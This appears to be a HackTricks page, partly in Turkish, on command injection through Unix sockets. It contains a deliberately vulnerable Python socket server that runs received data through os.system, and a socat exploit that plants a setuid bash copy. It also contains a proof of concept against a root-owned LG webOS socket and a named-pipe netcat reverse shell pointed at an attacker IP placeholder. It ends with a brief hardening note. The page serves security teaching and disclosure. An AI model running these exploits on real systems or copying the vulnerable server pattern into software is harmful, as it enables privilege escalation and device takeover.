# Socket Command Injection

{{#include ../../banners/hacktricks-training.md}}

## Socket binding example with Python

Aşağıdaki örnekte bir **unix socket oluşturulur** (`/tmp/socket_test.s`) ve **alınan** her şey `os.system` tarafından **çalıştırılacaktır**. Bunu gerçek hayatta bulmayacağınızı biliyorum, ama bu örneğin amacı unix sockets kullanan bir kodun nasıl göründüğünü ve girişi en kötü durumda nasıl yöneteceğimizi görmek.
```python:s.py
import socket
import os, os.path
import time
from collections import deque

if os.path.exists("/tmp/socket_test.s"):
os.remove("/tmp/socket_test.s")

server = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
server.bind("/tmp/socket_test.s")
os.system("chmod o+w /tmp/socket_test.s")
while True:
server.listen(1)
conn, addr = server.accept()
datagram = conn.recv(1024)
if datagram:
print(datagram)
os.system(datagram)
conn.close()
```
**Kodu çalıştırın** python ile: `python s.py` ve **socket'in nasıl dinlediğini kontrol edin**:
```python
netstat -a -p --unix | grep "socket_test"
(Not all processes could be identified, non-owned process info
will not be shown, you would have to be root to see it all.)
unix  2      [ ACC ]     STREAM     LISTENING     901181   132748/python        /tmp/socket_test.s
```
**Exploit**
```python
echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;" | socat - UNIX-CLIENT:/tmp/socket_test.s
```
## Case study: Root-owned UNIX socket signal-triggered escalation (LG webOS)

Bazı ayrıcalıklı daemon'lar, untrusted input kabul eden ve ayrıcalıklı eylemleri thread-IDs ve signals ile ilişkilendiren root-owned UNIX socket açar. Protokol unprivileged bir client'ın hangi native thread'in hedefleneceğini etkilemesine izin veriyorsa, ayrıcalıklı bir kod yolunu tetikleyip yükseltme (escalation) gerçekleştirebilirsiniz.

Observed pattern:
- Connect to a root-owned socket (e.g., /tmp/remotelogger).
- Create a thread and obtain its native thread id (TID).
- Send the TID (packed) plus padding as a request; receive an acknowledgement.
- Deliver a specific signal to that TID to trigger the privileged behaviour.

Minimal PoC taslağı:
```python
import socket, struct, os, threading, time
# Spawn a thread so we have a TID we can signal
th = threading.Thread(target=time.sleep, args=(600,)); th.start()
tid = th.native_id  # Python >=3.8
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect("/tmp/remotelogger")
s.sendall(struct.pack('<L', tid) + b'A'*0x80)
s.recv(4)  # sync
os.kill(tid, 4)  # deliver SIGILL (example from the case)
```
Bunu root shell'e çevirmek için basit bir named-pipe + nc deseni kullanılabilir:
```bash
rm -f /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc <ATTACKER-IP> 23231 > /tmp/f
```
Notlar:
- Bu tür hatalar, ayrıcalıksız istemci durumundan (TIDs) türetilen değerlere güvenilmesi ve bunların ayrıcalıklı signal handlers veya mantığına bağlanmasıyla ortaya çıkar.
- Socket üzerinde kimlik doğrulaması uygulayarak, mesaj formatlarını doğrulayarak ve ayrıcalıklı işlemleri dışarıdan sağlanan thread identifiers'dan ayırarak sertleştirin.

## Referanslar

- [LG WebOS TV Path Traversal, Authentication Bypass and Full Device Takeover (SSD Disclosure)](https://ssd-disclosure.com/lg-webos-tv-path-traversal-authentication-bypass-and-full-device-takeover/)

{{#include ../../banners/hacktricks-training.md}}
